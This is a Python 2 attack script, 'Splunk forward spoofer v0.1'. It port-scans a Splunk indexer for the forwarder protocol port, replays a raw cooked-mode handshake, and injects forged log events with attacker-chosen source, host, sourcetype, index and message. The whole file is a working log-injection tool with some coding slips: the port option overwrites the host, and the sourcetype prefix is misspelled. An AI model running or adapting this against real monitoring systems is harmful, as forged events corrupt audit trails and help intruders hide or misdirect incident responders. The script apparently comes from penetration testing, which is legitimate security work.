#!/usr/bin/python

import socket, struct, getopt, sys, binascii

def usage():
        print """USAGE: ./spooforward.py [options]:\n
\t-r, --host <file>\tServer address (indexer instance)
\t-p, --port <address>\tServer port (default: 9997)
\t-s, --source <pid>\tSpoofed source ex. udp:514
\t-l, --shost <num>\tSpoofed host address
\t-t, --type <type>\tSource type
\t-i, --index <index>\tIndex to forward to ex. default, main
\t-m, --message <message>\t Spoofed event content (limit: 255)
\t-d, --debug\t Enable debugging
\t-c, --check\t Scan host
\t-h, --help\t This help message\n\n"""
        sys.exit(1)

def debug(debug, msg):
	if debug == 1:
		print >>sys.stderr, "[DBG]" + str(msg) + "\n"

def check_port(h, addr, port):
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.settimeout(3)
		sock.connect((rhost, port))
		sock.send(h)
		resp = sock.recv(1024)
		sock.close()
		if 'cap_response=success' in resp:
			return True
		else:
			return False
	except:
		return False

def scan_host(h, addr):
	print "\033[34m[i] Scanning host " + addr +"..." + "\033[0m\n"
	for i in range(1024,16384):
		if check_port(h, addr, i):
			print "\033[32m[+] Found active port: %d" % i + "\033[0m\n"
			return i
	return 0

def main():
	print "\n\033[34m[i] Splunk forward spoofer v0.1\n\033[0m"
	try:
		opts, args = getopt.getopt(sys.argv[1:], "hdcr:p:s:l:t:i:m:", ["help", "debug", "check", "host=", "port=", "source=", "shost=", "type=", "index=", "message="])
	except getopt.GetoptError as err:
		print >>sys.stderr, str(err)
		sys.exit(2)

	global rhost, rport, source, shost, sourcetype, index, message, dbg, chk_host
	rhost = "127.0.0.1"
	rport = 9997
	source = "udp:514"
	shost = "spoofed_host.com"
	sourcetype = "syslog"
	index = "main"
	message = "spoofed message"
	dbg = 0
	chk_host = 0

	try:
		for o, a in opts:
			if o in ("-h", "--help"):
				usage()
			elif o in ("-r", "--host"):
				rhost = a
			elif o in ("-p", "--port"):
				rhost = int(a)
			elif o in ("-s", "--source"):
				source = a
			elif o in ("-l", "--shost"):
				shost = a
			elif o in ("-t", "--type"):
				sourcetype = a
			elif o in ("-i", "--index"):
				index = a
			elif o in ("-m", "--message"):
				if len(message)>255:
					assert False, "Option parsinng error"
				else:
					message = a
			elif o in ("-d", "--debug"):
				dbg = 1
			elif o in ("-c", "--check"):
				chk_host = 1
			else:
				assert False, "Option parsinng error"
	except Exception as err:
		print >>sys.stderr, str(err)
		usage()

	hello='--splunk-cooked-mode-v3--\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x001337\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008089\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x01\x00\x00\x00\x13__s2s_capabilities\x00\x00\x00\x00\x14ack=0;compression=0\x00\x00\x00\x00\x00\x00\x00\x00\x05_raw\x00'

	source = "source::" + source
	shost = "host::" + shost
	sorcetype = "sourcetype::" + sourcetype

	payload = (	"\xfe\x03" 
			+ chr(len(source)+1)
			+ source
			+ chr(len(shost)+1)
			+ shost
			+ chr(len(sourcetype)+1)
			+ sourcetype 
			+ "\x022\x00\xfc\x03\xff\x06\xc4\xc0\x85\xcc\x9d\x9b\xf0\xa3\xe0\x01b\x01\x08"  
			+ "\x97\xa1\xe5\xb6\x05" # <- DATETIME TIMESTAMP (unknown format)
			+ "\x03J.0\x04\x05_path\x0c/tmp/unknown\x04\x0f_MetaData:Index"
			+ chr(len(index))
			+ index
			+ chr(len(message))
			+ message
		  )


	#ORIG
	#ca='\xfe\x03\x0fsource::/tmp/X\x0ehost::postern\x14sourcetype::pentest\x022\x00\xfc\x03\xff\x06\xc4\xc0\x85\xcc\x9d\x9b\xf0\xa3\xe0\x01b\x01\x08\x94\xa6\xa5\xc6\x05\x03J.0\x04\x05_path\x06/tmp/X\x04\x0f_MetaData:Index\x07default\x05XXXXX'

	if chk_host == 1:
		portscan = scan_host(hello, rhost)
		if portscan != 0:
			rport = int(portscan)
		else:
			debug(1,"\033[31m [ERR] " + "No open ports found." + "\033[0m")
			sys.exit(1)
	debug(dbg,"\033[31m [PLD] " + repr(payload) + "\033[0m") 
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((rhost, rport))
	sock.send(hello)
	debug(dbg,"\033[33m [RCV] " + repr(sock.recv(1024)) + "\033[0m")
	sock.send(payload)
	debug(1,"\033[32m [FIN] " + "PAYLOAD SUCCESSFULY SENT" + "\033[0m")
	sock.close()

if __name__ == "__main__":
	main()
